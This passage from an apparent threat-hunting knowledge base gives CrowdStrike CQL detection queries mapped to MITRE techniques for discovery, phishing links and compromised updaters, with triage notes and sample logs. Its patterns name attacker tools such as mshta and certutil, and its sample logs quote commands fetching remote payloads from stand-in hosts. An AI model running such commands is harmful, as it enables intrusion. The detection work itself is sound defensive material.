| CommandLine=/(whoami\s+\/all|net\s+(user|group|view)|nltest|quser|ipconfig\s+\/all)/i
| groupBy([aid, ComputerName, UserName], function=[count(as=discovery_count), collect(CommandLine, limit=15)])
| discovery_count >= 4
| select([ComputerName, aid, UserName, discovery_count, CommandLine])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Clustered discovery by a single user, often after interactive or remote logon.
* Triage Steps: Validate logon source, MFA, impossible travel, and whether the user normally performs administration.
* Potential False Positives: Admin sessions and helpdesk troubleshooting.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","UserName":"alice","CommandLine":"whoami /all"}
```

---

### [[T1566.002]] - Spearphishing Link

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1566.002
> technique_name:: Spearphishing Link
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Initial_Access

* Detection Objective: Detect chat/mail/browser launch chains where a clicked link results in script, ISO, HTA, or shortcut execution.
* Telemetry Requirements: ProcessRollup2, DnsRequest

#### Production-Ready CQL Query:

```cql
// Title: Phishing Link to Script Execution Chain
// Focus: Teams/Outlook/browser parent launching script or mounted-image content
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^(outlook|teams|slack|chrome|msedge|firefox)\.exe$/i
| ImageFileName=/\\(mshta|wscript|cscript|powershell|pwsh|rundll32|regsvr32|cmd)\.exe$/i
| CommandLine=/(http|https|\.hta|\.js|\.vbs|\.lnk|\.iso|\\INetCache\\|\\Downloads\\|\\Temp\\)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: User communications or browser parent and script/LOLBAS child.
* Triage Steps: Review message/email URL and downloaded artifact; correlate with DNS and file writes.
* Potential False Positives: Legitimate links opening helper scripts are uncommon but possible in admin workflows.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"Teams.exe","FileName":"mshta.exe","CommandLine":"mshta https://example.com/invoice.hta"}
```

---

### [[T1195.002]] - Compromise Software Supply Chain

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1195.002
> technique_name:: Compromise Software Supply Chain
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Low
> tags:: CQL, MITRE/Initial_Access

* Detection Objective: Detect installer/update processes spawning unexpected shells or writing executables to user-writable staging directories, a host-level signal of potentially compromised update flow.
* Telemetry Requirements: ProcessRollup2, FileWritten

#### Production-Ready CQL Query:

```cql
// Title: Installer or Updater Spawning Shell
// Focus: update/install process launches interpreter or writes to suspicious path
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/(update|updater|installer|setup|msiexec|winget|choco|ninite).+\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|certutil|curl)\.exe$/i
| CommandLine=/(http|https|DownloadString|\\Users\\Public\\|\\ProgramData\\|\\Temp\\|-enc\b|urlcache)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Updater/installer parent with shell, download, or interpreter child.
* Triage Steps: Validate signer and update channel; check if multiple hosts show same updater chain.
* Potential False Positives: Legitimate installers invoking scripts; tune known enterprise software.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"updater.exe","FileName":"powershell.exe","CommandLine":"powershell Invoke-WebRequest http://cdn.example/a.dll"}
```

---

### [[T1566]] - Phishing — CQL Hub: Phishing - List of links opened from Outlook

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1566
> technique_name:: Phishing
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Hunt_links_opened_from_Outlook.yml
> cql_hub_name:: Phishing - List of links opened from Outlook
> cql_hub_author:: CrowdStrike
> cql_hub_mitre_ids:: T1566
> related_mitre_ids:: T1566
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: Community-contributed CQL Hub query mapped to this ATT&CK technique.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Hunt_links_opened_from_Outlook.yml`), author: CrowdStrike.
* Original CQL Hub MITRE IDs: T1566.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2 
| aid=?aid ImageFileName=/\\outlook\.exe/i
| regex("(?<FileName>[^\\/|\\\\]*)$", field=ImageFileName, strict=false)
| join(
    {
      #event_simpleName=ProcessRollup2 ImageFileName=/(chrome|firefox|iexplore)\.exe/i
      | MD5:=MD5HashData | ImageFileName=/(\/|\\)(?<ChildFileName>\w*\.?\w*)$/ 
      | ChildCLI:=CommandLine
    }, 
    key=ParentProcessId, field=TargetProcessId, include=[MD5, ChildFileName, ChildCLI]
  ) 
| groupBy([aid, FileName, CommandLine, ChildFileName, ChildCLI, MD5], limit=max)

```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `Hunt_links_opened_from_Outlook.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.
